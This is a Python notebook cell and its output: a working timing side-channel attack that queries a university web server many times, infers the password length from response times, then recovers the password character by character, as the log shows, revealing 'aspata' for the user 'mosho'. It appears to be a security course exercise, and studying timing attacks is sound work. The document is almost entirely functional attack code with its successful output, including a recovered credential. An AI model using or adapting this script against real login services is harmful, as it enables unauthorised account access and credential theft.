# %%
import sys
import time
import string
import statistics

import requests

from operator import itemgetter

URL = "http://aoi.ise.bgu.ac.il"
N = 5
MAX_TOKEN_SIZE = 32


class PasswordFound(Exception):

    def __init__(self, password):
        self.password = password


def try_to_hack(characters):
    timings = []

    # Print a . without a newline
    print('.', end='', flush=True)

    # Do N HTTP calls
    for i in range(N):
        before = time.perf_counter()
        result = requests.get(URL, params={'user': 'mosho', 'password': characters})
        after = time.perf_counter()

        if result.content == b'1':
            raise PasswordFound(characters)

        timings.append(after - before)

    return timings


def find_next_character(base, TOKEN_SIZE):
    measures = []
    
    print("Trying to find the character at position %s with prefix %r" % ((len(base) + 1), base))
    for i, character in enumerate(string.ascii_lowercase):
        timings = try_to_hack(base + character + "0" * (TOKEN_SIZE - len(base) - 1))

        median = statistics.median(timings)
        min_timing = min(timings)
        max_timing = max(timings)
        stddev = statistics.stdev(timings)

        print(f'searching: {base + character + "0" * (TOKEN_SIZE - len(base) - 1)}', {'character': character, 'median': median, 'min': min_timing,
                         'max': max_timing, 'stddev': stddev})
        
        measures.append({'character': character, 'median': median, 'min': min_timing,
                         'max': max_timing, 'stddev': stddev})

    sorted_measures = list(sorted(measures, key=itemgetter('median'), reverse=True))

    found_character = sorted_measures[0]
    top_characters = sorted_measures[1:4]

    print("Found character at position %s: %r" % ((len(base) + 1), found_character['character']))
    msg = "Median: %s Max: %s Min: %s Stddev: %s"
    print(msg % (found_character['median'], found_character['max'], found_character['min'], found_character['stddev']))

    print()
    print("Following characters were:")

    for top_character in top_characters:
        ratio = int((1 - (top_character['median'] / found_character['median'])) * 100)
        msg ="Character: %r Median: %s Max: %s Min: %s Stddev: %s (%d%% slower)"
        print(msg % (top_character['character'], top_character['median'], top_character['max'], top_character['min'], top_character['stddev'], ratio))

    return found_character['character']


def main():
    # Do a first request to start the keep-alive connection
    requests.get(URL)

    base = ''
    times_by_len = dict()
    
    for pass_length in range(1, MAX_TOKEN_SIZE+1):
        characters = 'a' * pass_length

        before = time.perf_counter()
        result = requests.get(URL, params={'user': 'mosho', 'password': characters})
        after = time.perf_counter()

        times_by_len[pass_length] = after - before
        print(f'Checking length of {pass_length}: time: {times_by_len[pass_length]}')
    
    # Password length is set to the maximum response time from the server.
    # This 'max' function returns the key that has the maximum value.
    TOKEN_SIZE = max(times_by_len, key=times_by_len.get)
    print(f'The password assumed length: {TOKEN_SIZE}\n')
    
    try:
        while len(base) != TOKEN_SIZE:
            next_character = find_next_character(base, TOKEN_SIZE)
            base += next_character
            print("\n\n", end="")
    except PasswordFound as e:
        print("\n\n", end="")
        print("The token is: %r %s" % (e.password, '!'*10))
        sys.exit(0)
    else:
        print("The password is not found, check the allowed character and token size")
        sys.exit(1)


if __name__ == '__main__':
    main()
# Out:
# Checking length of 1: time: 0.04104849999999999
# Checking length of 2: time: 0.05163670000000001
# Checking length of 3: time: 0.1639703
# Checking length of 4: time: 0.04821690000000001
# Checking length of 5: time: 0.051455200000000034
# Checking length of 6: time: 0.9938669000000001
# Checking length of 7: time: 0.17229269999999985
# Checking length of 8: time: 0.04522879999999985
# Checking length of 9: time: 0.04700380000000015
# Checking length of 10: time: 0.05270869999999994
# Checking length of 11: time: 0.14664169999999999
# Checking length of 12: time: 0.050915400000000055
# Checking length of 13: time: 0.049948799999999904
# Checking length of 14: time: 0.048822799999999944
# Checking length of 15: time: 0.16317650000000006
# Checking length of 16: time: 0.04337189999999991
# Checking length of 17: time: 0.0703096999999997
# Checking length of 18: time: 0.15211229999999976
# Checking length of 19: time: 0.06722550000000016
# Checking length of 20: time: 0.04570659999999993
# Checking length of 21: time: 0.18394789999999972
# Checking length of 22: time: 0.049447300000000194
# Checking length of 23: time: 0.045509299999999975
# Checking length of 24: time: 0.0498729
# Checking length of 25: time: 0.21641189999999977
# Checking length of 26: time: 0.04564479999999982
# Checking length of 27: time: 0.046686600000000134
# Checking length of 28: time: 0.05038749999999981
# Checking length of 29: time: 0.13624599999999987
# Checking length of 30: time: 0.051694899999999766
# Checking length of 31: time: 0.07265319999999997
# Checking length of 32: time: 0.21886839999999985
# The password assumed length: 6
#
# Trying to find the character at position 1 with prefix ''
# .searching: a00000 {'character': 'a', 'median': 0.9110300999999996, 'min': 0.8235165999999996, 'max': 0.9184131999999998, 'stddev': 0.03986433068086066}
# .searching: b00000 {'character': 'b', 'median': 0.6556636999999998, 'min': 0.615538299999999, 'max': 0.6913433999999992, 'stddev': 0.029222770898000166}
# .searching: c00000 {'character': 'c', 'median': 0.7055676000000002, 'min': 0.6485611999999996, 'max': 0.7550191000000002, 'stddev': 0.042004709347203205}
# .searching: d00000 {'character': 'd', 'median': 0.6792370000000005, 'min': 0.6623423000000006, 'max': 0.9094726000000009, 'stddev': 0.1045544341929457}
# .searching: e00000 {'character': 'e', 'median': 0.6249044999999995, 'min': 0.6049773000000016, 'max': 0.638643799999997, 'stddev': 0.01583158546125329}
# .searching: f00000 {'character': 'f', 'median': 0.6771283999999973, 'min': 0.6090245000000003, 'max': 0.6923513999999997, 'stddev': 0.03382022997664204}
# .searching: g00000 {'character': 'g', 'median': 0.6797876000000009, 'min': 0.6091692999999978, 'max': 0.6997064999999978, 'stddev': 0.03708086216120188}
# .searching: h00000 {'character': 'h', 'median': 0.6880774999999986, 'min': 0.6344546999999991, 'max': 0.7064312000000008, 'stddev': 0.02798878485727821}
# .searching: i00000 {'character': 'i', 'median': 0.6471311999999969, 'min': 0.6315859000000046, 'max': 0.6677259999999983, 'stddev': 0.015276287748563567}
# .searching: j00000 {'character': 'j', 'median': 0.6277912999999984, 'min': 0.612671799999994, 'max': 0.6633681000000067, 'stddev': 0.02071650331443855}
# .searching: k00000 {'character': 'k', 'median': 0.6275082999999952, 'min': 0.6156931999999955, 'max': 0.7293446999999986, 'stddev': 0.0593419057762306}
# .searching: l00000 {'character': 'l', 'median': 0.6336408999999961, 'min': 0.6040672000000029, 'max': 0.798782199999998, 'stddev': 0.08283969568079669}
# .searching: m00000 {'character': 'm', 'median': 0.6744760999999997, 'min': 0.5973011000000028, 'max': 0.7411391999999992, 'stddev': 0.05140440234780352}
# .searching: n00000 {'character': 'n', 'median': 0.6707301999999942, 'min': 0.6205444, 'max': 0.699600199999999, 'stddev': 0.029965474689682168}
# .searching: o00000 {'character': 'o', 'median': 0.6800557999999981, 'min': 0.6287780000000041, 'max': 0.7173232000000027, 'stddev': 0.03903099502392908}
# .searching: p00000 {'character': 'p', 'median': 0.6834992, 'min': 0.666503800000001, 'max': 0.7211898999999988, 'stddev': 0.02136105993725434}
# .searching: q00000 {'character': 'q', 'median': 0.6492609000000016, 'min': 0.6423109999999994, 'max': 1.1975972999999982, 'stddev': 0.2430834402242048}
# .searching: r00000 {'character': 'r', 'median': 0.6688467999999972, 'min': 0.6438229000000035, 'max': 0.7007746999999966, 'stddev': 0.022365123967840638}
# .searching: s00000 {'character': 's', 'median': 0.639967900000002, 'min': 0.5774677999999938, 'max': 0.6560938000000078, 'stddev': 0.030581064635707422}
# .searching: t00000 {'character': 't', 'median': 0.6403031999999911, 'min': 0.595416599999993, 'max': 0.6686957999999947, 'stddev': 0.030970419587050397}
# .searching: u00000 {'character': 'u', 'median': 0.6868271000000021, 'min': 0.6217357999999962, 'max': 0.7288278999999989, 'stddev': 0.04253265206176173}
# .searching: v00000 {'character': 'v', 'median': 0.6972317000000032, 'min': 0.6462658999999888, 'max': 0.7204418999999973, 'stddev': 0.029129326480511086}
# .searching: w00000 {'character': 'w', 'median': 0.6329086000000075, 'min': 0.6059754000000055, 'max': 0.6998075000000057, 'stddev': 0.04360019503465843}
# .searching: x00000 {'character': 'x', 'median': 0.6598070000000007, 'min': 0.545634800000002, 'max': 0.6965667000000053, 'stddev': 0.06912193830465935}
# .searching: y00000 {'character': 'y', 'median': 0.6525390999999985, 'min': 0.6242100999999991, 'max': 0.6779066999999941, 'stddev': 0.020271530428730852}
# .searching: z00000 {'character': 'z', 'median': 0.6427134000000052, 'min': 0.617342899999997, 'max': 4.786796299999992, 'stddev': 1.8556072965651917}
# Found character at position 1: 'a'
# Median: 0.9110300999999996 Max: 0.9184131999999998 Min: 0.8235165999999996 Stddev: 0.03986433068086066
#
# Following characters were:
# Character: 'c' Median: 0.7055676000000002 Max: 0.7550191000000002 Min: 0.6485611999999996 Stddev: 0.042004709347203205 (22% slower)
# Character: 'v' Median: 0.6972317000000032 Max: 0.7204418999999973 Min: 0.6462658999999888 Stddev: 0.029129326480511086 (23% slower)
# Character: 'h' Median: 0.6880774999999986 Max: 0.7064312000000008 Min: 0.6344546999999991 Stddev: 0.02798878485727821 (24% slower)
#
#
# Trying to find the character at position 2 with prefix 'a'
# .searching: aa0000 {'character': 'a', 'median': 0.8968327000000045, 'min': 0.8857485999999994, 'max': 4.085691499999996, 'stddev': 1.4267913362393485}
# .searching: ab0000 {'character': 'b', 'median': 0.9246736999999996, 'min': 0.8985217999999975, 'max': 0.963023899999996, 'stddev': 0.023202790545815515}
# .searching: ac0000 {'character': 'c', 'median': 0.9020268000000016, 'min': 0.8733130999999901, 'max': 0.9437158000000068, 'stddev': 0.030492355870335844}
# .searching: ad0000 {'character': 'd', 'median': 0.9050685999999928, 'min': 0.8951879000000105, 'max': 1.548215500000012, 'stddev': 0.2861866051324292}
# .searching: ae0000 {'character': 'e', 'median': 0.8975209999999976, 'min': 0.8086240000000089, 'max': 1.1077874999999864, 'stddev': 0.11088932974794424}
# .searching: af0000 {'character': 'f', 'median': 0.8996817000000021, 'min': 0.8649922000000032, 'max': 0.9213812999999931, 'stddev': 0.025630359880674528}
# .searching: ag0000 {'character': 'g', 'median': 0.913320299999981, 'min': 0.9099980000000016, 'max': 0.9372664999999927, 'stddev': 0.011520844226354706}
# .searching: ah0000 {'character': 'h', 'median': 0.9026349000000096, 'min': 0.8798494000000119, 'max': 0.968572800000004, 'stddev': 0.03976809932542145}
# .searching: ai0000 {'character': 'i', 'median': 0.876638000000014, 'min': 0.8640259000000015, 'max': 0.9300068999999951, 'stddev': 0.032537856301745174}
# .searching: aj0000 {'character': 'j', 'median': 0.9272861999999975, 'min': 0.895229100000023, 'max': 0.9451358999999968, 'stddev': 0.018129497314671}
# .searching: ak0000 {'character': 'k', 'median': 0.891024299999998, 'min': 0.8713779000000272, 'max': 0.9196304000000168, 'stddev': 0.018151131870130354}
# .searching: al0000 {'character': 'l', 'median': 0.9320552000000077, 'min': 0.8607799000000114, 'max': 1.7330536000000052, 'stddev': 0.3707507884170805}
# .searching: am0000 {'character': 'm', 'median': 0.9103599999999972, 'min': 0.8840285999999935, 'max': 0.9386091000000079, 'stddev': 0.02520049816883353}
# .searching: an0000 {'character': 'n', 'median': 0.9341978999999867, 'min': 0.9258637000000078, 'max': 0.9921827000000008, 'stddev': 0.029154257055396943}
# .searching: ao0000 {'character': 'o', 'median': 0.9127313999999842, 'min': 0.8710770000000139, 'max': 0.9432864999999993, 'stddev': 0.02595061111630361}
# .searching: ap0000 {'character': 'p', 'median': 0.9208846999999878, 'min': 0.8919813999999917, 'max': 0.9333729999999889, 'stddev': 0.016384442953395615}
# .searching: aq0000 {'character': 'q', 'median': 0.9088323000000003, 'min': 0.8808488999999895, 'max': 0.9401378000000022, 'stddev': 0.0236204069701822}
# .searching: ar0000 {'character': 'r', 'median': 0.9472973999999965, 'min': 0.8844682000000148, 'max': 1.1597271999999919, 'stddev': 0.11047324331324217}
# .searching: as0000 {'character': 's', 'median': 1.1713842999999997, 'min': 1.1625323000000094, 'max': 1.193987600000014, 'stddev': 0.012180417252420693}
# .searching: at0000 {'character': 't', 'median': 0.9178708999999969, 'min': 0.8904263999999955, 'max': 1.1842322999999908, 'stddev': 0.12405159893322933}
# .searching: au0000 {'character': 'u', 'median': 0.9058015999999895, 'min': 0.8373622000000012, 'max': 1.0231923999999992, 'stddev': 0.07163289465239925}
# .searching: av0000 {'character': 'v', 'median': 0.9288208999999767, 'min': 0.8805572999999924, 'max': 0.9441950000000077, 'stddev': 0.025922098304055768}
# .searching: aw0000 {'character': 'w', 'median': 0.9257439000000147, 'min': 0.8649221000000011, 'max': 0.9379850999999917, 'stddev': 0.033917800860614265}
# .searching: ax0000 {'character': 'x', 'median': 0.9227051999999958, 'min': 0.8892813999999873, 'max': 0.9407755999999949, 'stddev': 0.01951346957391211}
# .searching: ay0000 {'character': 'y', 'median': 0.9234225000000151, 'min': 0.9018733999999995, 'max': 0.9632864000000154, 'stddev': 0.024927493824957916}
# .searching: az0000 {'character': 'z', 'median': 0.9095291000000145, 'min': 0.8905838999999958, 'max': 0.9519873999999788, 'stddev': 0.02362796433545718}
# Found character at position 2: 's'
# Median: 1.1713842999999997 Max: 1.193987600000014 Min: 1.1625323000000094 Stddev: 0.012180417252420693
#
# Following characters were:
# Character: 'r' Median: 0.9472973999999965 Max: 1.1597271999999919 Min: 0.8844682000000148 Stddev: 0.11047324331324217 (19% slower)
# Character: 'n' Median: 0.9341978999999867 Max: 0.9921827000000008 Min: 0.9258637000000078 Stddev: 0.029154257055396943 (20% slower)
# Character: 'l' Median: 0.9320552000000077 Max: 1.7330536000000052 Min: 0.8607799000000114 Stddev: 0.3707507884170805 (20% slower)
#
#
# Trying to find the character at position 3 with prefix 'as'
# .searching: asa000 {'character': 'a', 'median': 1.1705281000000127, 'min': 1.1508798000000127, 'max': 1.474714999999975, 'stddev': 0.13696417083085216}
# .searching: asb000 {'character': 'b', 'median': 1.176257899999996, 'min': 1.1263261, 'max': 3.5800648000000024, 'stddev': 1.0831992638444334}
# .searching: asc000 {'character': 'c', 'median': 1.1577286000000129, 'min': 1.1306537000000105, 'max': 1.1654901999999936, 'stddev': 0.016968598614205705}
# .searching: asd000 {'character': 'd', 'median': 1.155205499999994, 'min': 1.1116370000000018, 'max': 1.217048300000016, 'stddev': 0.049602672224744244}
# .searching: ase000 {'character': 'e', 'median': 1.138045599999998, 'min': 1.0987128000000155, 'max': 1.223269799999997, 'stddev': 0.0456213163124169}
# .searching: asf000 {'character': 'f', 'median': 1.1662787000000208, 'min': 1.0902397999999778, 'max': 1.2069180000000301, 'stddev': 0.04372334277368029}
# .searching: asg000 {'character': 'g', 'median': 1.153802399999961, 'min': 1.1092363999999861, 'max': 1.2022517000000335, 'stddev': 0.03788453724557454}
# .searching: ash000 {'character': 'h', 'median': 1.1588872999999467, 'min': 1.1136824999999817, 'max': 1.3958911999999941, 'stddev': 0.1137598055724972}
# .searching: asi000 {'character': 'i', 'median': 1.1666151000000013, 'min': 1.1434756000000448, 'max': 1.3321420999999987, 'stddev': 0.07822241522295639}
# .searching: asj000 {'character': 'j', 'median': 1.181139700000017, 'min': 1.110324300000002, 'max': 1.2047833999999966, 'stddev': 0.03952510392556443}
# .searching: ask000 {'character': 'k', 'median': 1.1399756000000139, 'min': 1.1275789000000032, 'max': 1.1793444999999565, 'stddev': 0.02039928551761629}
# .searching: asl000 {'character': 'l', 'median': 1.1226555999999732, 'min': 1.0733405999999945, 'max': 1.2311743000000206, 'stddev': 0.06001398476504414}
# .searching: asm000 {'character': 'm', 'median': 1.1964307999999733, 'min': 1.1433255999999687, 'max': 3.7151542999999947, 'stddev': 1.137741119297662}
# .searching: asn000 {'character': 'n', 'median': 1.1519067999999493, 'min': 1.1061030999999844, 'max': 1.222680299999979, 'stddev': 0.04578090343476495}
# .searching: aso000 {'character': 'o', 'median': 1.1644281000000092, 'min': 1.1262567999999646, 'max': 1.1877000999999723, 'stddev': 0.023528342079780527}
# .searching: asp000 {'character': 'p', 'median': 1.3991939000000002, 'min': 1.3460977999999955, 'max': 1.4755742000000396, 'stddev': 0.054658701853983735}
# .searching: asq000 {'character': 'q', 'median': 1.1436186999999904, 'min': 1.110642499999983, 'max': 1.294642300000021, 'stddev': 0.07360603416018448}
# .searching: asr000 {'character': 'r', 'median': 1.1749537000000032, 'min': 1.1476277999999525, 'max': 1.2293662000000154, 'stddev': 0.03432476699106127}
# .searching: ass000 {'character': 's', 'median': 1.1580748000000085, 'min': 1.124514099999999, 'max': 1.17077919999997, 'stddev': 0.017704368795490574}
# .searching: ast000 {'character': 't', 'median': 1.200279299999977, 'min': 1.1291132999999718, 'max': 1.2240247000000295, 'stddev': 0.03971262139307313}
# .searching: asu000 {'character': 'u', 'median': 1.1630223000000228, 'min': 1.1138804999999934, 'max': 1.1669071999999687, 'stddev': 0.022585407254421548}
# .searching: asv000 {'character': 'v', 'median': 1.145161499999972, 'min': 1.1350630000000024, 'max': 1.2046224000000052, 'stddev': 0.030771784395670205}
# .searching: asw000 {'character': 'w', 'median': 1.116150599999969, 'min': 1.0954489999999737, 'max': 1.1834817000000157, 'stddev': 0.03812862984382901}
# .searching: asx000 {'character': 'x', 'median': 1.1826456000000007, 'min': 1.04372010000003, 'max': 1.4271881999999891, 'stddev': 0.165479194666328}
# .searching: asy000 {'character': 'y', 'median': 1.1671137000000158, 'min': 1.1345040000000495, 'max': 1.532975800000031, 'stddev': 0.1676832373023426}
# .searching: asz000 {'character': 'z', 'median': 1.2081818999999996, 'min': 1.1196317000000136, 'max': 1.4729544999999575, 'stddev': 0.14247481860336564}
# Found character at position 3: 'p'
# Median: 1.3991939000000002 Max: 1.4755742000000396 Min: 1.3460977999999955 Stddev: 0.054658701853983735
#
# Following characters were:
# Character: 'z' Median: 1.2081818999999996 Max: 1.4729544999999575 Min: 1.1196317000000136 Stddev: 0.14247481860336564 (13% slower)
# Character: 't' Median: 1.200279299999977 Max: 1.2240247000000295 Min: 1.1291132999999718 Stddev: 0.03971262139307313 (14% slower)
# Character: 'm' Median: 1.1964307999999733 Max: 3.7151542999999947 Min: 1.1433255999999687 Stddev: 1.137741119297662 (14% slower)
#
#
# Trying to find the character at position 4 with prefix 'asp'
# .searching: aspa00 {'character': 'a', 'median': 1.6617356999999515, 'min': 1.632438499999978, 'max': 1.6984979000000067, 'stddev': 0.027594217041269464}
# .searching: aspb00 {'character': 'b', 'median': 1.4427766999999676, 'min': 1.4017820999999913, 'max': 1.4735088999999562, 'stddev': 0.029297657358572576}
# .searching: aspc00 {'character': 'c', 'median': 1.405035899999973, 'min': 1.3927970999999957, 'max': 1.4636136000000306, 'stddev': 0.02911139075306867}
# .searching: aspd00 {'character': 'd', 'median': 1.397019299999954, 'min': 1.3721746999999596, 'max': 1.4423378000000184, 'stddev': 0.026634577033135345}
# .searching: aspe00 {'character': 'e', 'median': 1.405664100000024, 'min': 1.3381595000000175, 'max': 1.4363447000000065, 'stddev': 0.036807823351667976}
# .searching: aspf00 {'character': 'f', 'median': 1.37774330000002, 'min': 1.3758098999999788, 'max': 1.455603300000007, 'stddev': 0.035829289344157855}
# .searching: aspg00 {'character': 'g', 'median': 1.4306178999999588, 'min': 1.3549356999999986, 'max': 1.4425185000000056, 'stddev': 0.03738363650005234}
# .searching: asph00 {'character': 'h', 'median': 1.4171678999999813, 'min': 1.3210280000000125, 'max': 1.7286900000000287, 'stddev': 0.15514144929936002}
# .searching: aspi00 {'character': 'i', 'median': 1.4285039999999753, 'min': 1.3895612000000028, 'max': 1.476724499999989, 'stddev': 0.03415192801137827}
# .searching: aspj00 {'character': 'j', 'median': 1.4171615000000202, 'min': 1.4001633999999967, 'max': 1.4532823000000121, 'stddev': 0.023923146953983156}
# .searching: aspk00 {'character': 'k', 'median': 1.4117727000000286, 'min': 1.3740937999999687, 'max': 1.4507588999999825, 'stddev': 0.03128908020758653}
# .searching: aspl00 {'character': 'l', 'median': 1.3925135999999725, 'min': 1.3698159999999575, 'max': 1.4082683999999972, 'stddev': 0.015247957745233152}
# .searching: aspm00 {'character': 'm', 'median': 1.407221600000014, 'min': 1.341357099999982, 'max': 1.4346859000000336, 'stddev': 0.03661308005669329}
# .searching: aspn00 {'character': 'n', 'median': 1.3837350000000015, 'min': 1.3516898999999967, 'max': 1.4261127000000329, 'stddev': 0.027565144962032925}
# .searching: aspo00 {'character': 'o', 'median': 1.4117420000000038, 'min': 1.3708437999999887, 'max': 1.4562782000000425, 'stddev': 0.03578091289798218}
# .searching: aspp00 {'character': 'p', 'median': 1.4334674000000405, 'min': 1.380215000000021, 'max': 1.4752908000000389, 'stddev': 0.037126193391216714}
# .searching: aspq00 {'character': 'q', 'median': 1.4313339999999926, 'min': 1.347364999999968, 'max': 1.4503783999999769, 'stddev': 0.040666686375570214}
# .searching: aspr00 {'character': 'r', 'median': 1.4001944999999978, 'min': 1.3680543000000398, 'max': 1.4047678999999675, 'stddev': 0.0172373734300255}
# .searching: asps00 {'character': 's', 'median': 1.4134794999999372, 'min': 1.391676099999927, 'max': 1.4654522000000156, 'stddev': 0.029702888174866757}
# .searching: aspt00 {'character': 't', 'median': 1.3798559000000523, 'min': 1.3765908000000309, 'max': 1.4615298999999595, 'stddev': 0.03666616151318897}
# .searching: aspu00 {'character': 'u', 'median': 1.406072399999971, 'min': 1.372900399999935, 'max': 1.4532581999999366, 'stddev': 0.0362711280452279}
# .searching: aspv00 {'character': 'v', 'median': 1.372392399999967, 'min': 1.3323099000000411, 'max': 1.4441776000001028, 'stddev': 0.04323096947312166}
# .searching: aspw00 {'character': 'w', 'median': 1.4099817999999686, 'min': 1.394578000000024, 'max': 1.4312609999999495, 'stddev': 0.014039973164935922}
# .searching: aspx00 {'character': 'x', 'median': 1.4393978000000516, 'min': 1.4237302999999883, 'max': 1.4734628999999586, 'stddev': 0.0209234993800728}
# .searching: aspy00 {'character': 'y', 'median': 1.3985797000000275, 'min': 1.386366599999974, 'max': 1.4342087999999649, 'stddev': 0.018836091180940654}
# .searching: aspz00 {'character': 'z', 'median': 1.3950846000000183, 'min': 1.3886290000000372, 'max': 1.4672898999999688, 'stddev': 0.032863159047731065}
# Found character at position 4: 'a'
# Median: 1.6617356999999515 Max: 1.6984979000000067 Min: 1.632438499999978 Stddev: 0.027594217041269464
#
# Following characters were:
# Character: 'b' Median: 1.4427766999999676 Max: 1.4735088999999562 Min: 1.4017820999999913 Stddev: 0.029297657358572576 (13% slower)
# Character: 'x' Median: 1.4393978000000516 Max: 1.4734628999999586 Min: 1.4237302999999883 Stddev: 0.0209234993800728 (13% slower)
# Character: 'p' Median: 1.4334674000000405 Max: 1.4752908000000389 Min: 1.380215000000021 Stddev: 0.037126193391216714 (13% slower)
#
#
# Trying to find the character at position 5 with prefix 'aspa'
# .searching: aspaa0 {'character': 'a', 'median': 1.6776194999999916, 'min': 1.640922000000046, 'max': 1.6934582000000091, 'stddev': 0.02084841674586166}
# .searching: aspab0 {'character': 'b', 'median': 1.6333857000000762, 'min': 1.5989360999999462, 'max': 1.7053273000000218, 'stddev': 0.04003423990678557}
# .searching: aspac0 {'character': 'c', 'median': 1.6467262999999548, 'min': 1.6309117000000697, 'max': 1.7398938000000044, 'stddev': 0.05496234600006517}
# .searching: aspad0 {'character': 'd', 'median': 1.6391069000000016, 'min': 1.5734429000000318, 'max': 1.7231806000000915, 'stddev': 0.06426578657067152}
# .searching: aspae0 {'character': 'e', 'median': 1.6996034999999665, 'min': 1.6746909999999389, 'max': 1.727112199999965, 'stddev': 0.02259986088018719}
# .searching: aspaf0 {'character': 'f', 'median': 1.6535637000000634, 'min': 1.6350736000000552, 'max': 1.6746279000000186, 'stddev': 0.01600527194842878}
# .searching: aspag0 {'character': 'g', 'median': 1.6576654000000417, 'min': 1.6079305000000659, 'max': 1.6840387000000874, 'stddev': 0.030628769788088442}
# .searching: aspah0 {'character': 'h', 'median': 1.6576959000000215, 'min': 1.6258849000000737, 'max': 1.7285838999999896, 'stddev': 0.03881385109366992}
# .searching: aspai0 {'character': 'i', 'median': 1.6714643999999907, 'min': 1.6280916000000616, 'max': 1.6997023000000127, 'stddev': 0.029286374484489973}
# .searching: aspaj0 {'character': 'j', 'median': 1.648177099999998, 'min': 1.6418026000000054, 'max': 1.897091600000067, 'stddev': 0.11093783760229557}
# .searching: aspak0 {'character': 'k', 'median': 1.6800789000000123, 'min': 1.6570968999999423, 'max': 1.7388731999999436, 'stddev': 0.03036884036848368}
# .searching: aspal0 {'character': 'l', 'median': 1.6357239000000163, 'min': 1.6036692999999786, 'max': 1.6908766000000242, 'stddev': 0.03616373461227202}
# .searching: aspam0 {'character': 'm', 'median': 1.6379541000000017, 'min': 1.6177192000000105, 'max': 1.712599599999976, 'stddev': 0.04506294313215775}
# .searching: aspan0 {'character': 'n', 'median': 1.6753495000000385, 'min': 1.630288299999961, 'max': 1.7072104999999738, 'stddev': 0.02816460610879777}
# .searching: aspao0 {'character': 'o', 'median': 1.6402282000000241, 'min': 1.6139537000000246, 'max': 1.705901600000061, 'stddev': 0.03662857391936}
# .searching: aspap0 {'character': 'p', 'median': 1.6505997000000434, 'min': 1.6078107000000728, 'max': 1.6736996000000772, 'stddev': 0.024140802875142205}
# .searching: aspaq0 {'character': 'q', 'median': 1.6801450000000386, 'min': 1.6493128000000752, 'max': 1.6806098999999222, 'stddev': 0.013455352300545486}
# .searching: aspar0 {'character': 'r', 'median': 1.681351100000029, 'min': 1.6427039999999806, 'max': 1.8089142000000038, 'stddev': 0.06607773041043}
# .searching: aspas0 {'character': 's', 'median': 1.6580318000000034, 'min': 1.6473016999999572, 'max': 1.704466000000025, 'stddev': 0.025785876564020174}
# .searching: aspat0 {'character': 't', 'median': 1.9173234999999522, 'min': 1.9033161999999493, 'max': 1.978015199999959, 'stddev': 0.030227693196583267}
# .searching: aspau0 {'character': 'u', 'median': 1.6527820999999676, 'min': 1.6180226999999832, 'max': 1.699131599999987, 'stddev': 0.03414658311920306}
# .searching: aspav0 {'character': 'v', 'median': 1.6396770999999717, 'min': 1.6223079999999754, 'max': 1.714313299999958, 'stddev': 0.0423693493230092}
# .searching: aspaw0 {'character': 'w', 'median': 1.6594417999999678, 'min': 1.6078778999999486, 'max': 1.754976000000056, 'stddev': 0.05584255153565157}
# .searching: aspax0 {'character': 'x', 'median': 1.6580500999999686, 'min': 1.606092399999966, 'max': 1.665694799999983, 'stddev': 0.023896310864385345}
# .searching: aspay0 {'character': 'y', 'median': 1.6553861999999526, 'min': 1.6351290000000063, 'max': 1.706766200000061, 'stddev': 0.03572907596551156}
# .searching: aspaz0 {'character': 'z', 'median': 1.683040300000016, 'min': 1.600553399999967, 'max': 2.1383155000000897, 'stddev': 0.21454012577148288}
# Found character at position 5: 't'
# Median: 1.9173234999999522 Max: 1.978015199999959 Min: 1.9033161999999493 Stddev: 0.030227693196583267
#
# Following characters were:
# Character: 'e' Median: 1.6996034999999665 Max: 1.727112199999965 Min: 1.6746909999999389 Stddev: 0.02259986088018719 (11% slower)
# Character: 'z' Median: 1.683040300000016 Max: 2.1383155000000897 Min: 1.600553399999967 Stddev: 0.21454012577148288 (12% slower)
# Character: 'r' Median: 1.681351100000029 Max: 1.8089142000000038 Min: 1.6427039999999806 Stddev: 0.06607773041043 (12% slower)
#
#
# Trying to find the character at position 6 with prefix 'aspat'
# .
# ERROR:root:Internal Python error in the inspect module.
# Below is the traceback from this internal error.
# The token is: 'aspata' !!!!!!!!!!
# Traceback (most recent call last):
#   File "<ipython-input-1-5c853c558467>", line 103, in main
#     next_character = find_next_character(base, TOKEN_SIZE)
#   File "<ipython-input-1-5c853c558467>", line 46, in find_next_character
#     timings = try_to_hack(base + character + "0" * (TOKEN_SIZE - len(base) - 1))
#   File "<ipython-input-1-5c853c558467>", line 34, in try_to_hack
#     raise PasswordFound(characters)
# PasswordFound: aspata
#
# During handling of the above exception, another exception occurred:
#
# Traceback (most recent call last):
#   File "C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\interactiveshell.py", line 3343, in run_code
#     exec(code_obj, self.user_global_ns, self.user_ns)
#   File "<ipython-input-1-5c853c558467>", line 116, in <module>
#     main()
#   File "<ipython-input-1-5c853c558467>", line 109, in main
#     sys.exit(0)
# SystemExit: 0
#
# During handling of the above exception, another exception occurred:
#
# Traceback (most recent call last):
#   File "C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py", line 1169, in get_records
#     return _fixed_getinnerframes(etb, number_of_lines_of_context, tb_offset)
#   File "C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py", line 316, in wrapped
#     return f(*args, **kwargs)
#   File "C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py", line 350, in _fixed_getinnerframes
#     records = fix_frame_records_filenames(inspect.getinnerframes(etb, context))
#   File "C:\ProgramData\Miniconda3\lib\inspect.py", line 1490, in getinnerframes
#     frameinfo = (tb.tb_frame,) + getframeinfo(tb, context)
# AttributeError: 'tuple' object has no attribute 'tb_frame'
# ---------------------------------------------------------------------------
# PasswordFound                             Traceback (most recent call last)
# <ipython-input-1-5c853c558467> in main()
#     102         while len(base) != TOKEN_SIZE:
# --> 103             next_character = find_next_character(base, TOKEN_SIZE)
#     104             base += next_character
#
# <ipython-input-1-5c853c558467> in find_next_character(base, TOKEN_SIZE)
#      45     for i, character in enumerate(string.ascii_lowercase):
# ---> 46         timings = try_to_hack(base + character + "0" * (TOKEN_SIZE - len(base) - 1))
#      47
#
# <ipython-input-1-5c853c558467> in try_to_hack(characters)
#      33         if result.content == b'1':
# ---> 34             raise PasswordFound(characters)
#      35
#
# PasswordFound: aspata
#
# During handling of the above exception, another exception occurred:
#
# SystemExit                                Traceback (most recent call last)
#     [... skipping hidden 1 frame]
#
# <ipython-input-1-5c853c558467> in <module>
#     115 if __name__ == '__main__':
# --> 116     main()
#
# <ipython-input-1-5c853c558467> in main()
#     108         print("The token is: %r %s" % (e.password, '!'*10))
# --> 109         sys.exit(0)
#     110     else:
#
# SystemExit: 0
#
# During handling of the above exception, another exception occurred:
#
# TypeError                                 Traceback (most recent call last)
#     [... skipping hidden 1 frame]
#
# C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\interactiveshell.py in showtraceback(self, exc_tuple, filename, tb_offset, exception_only, running_compiled_code)
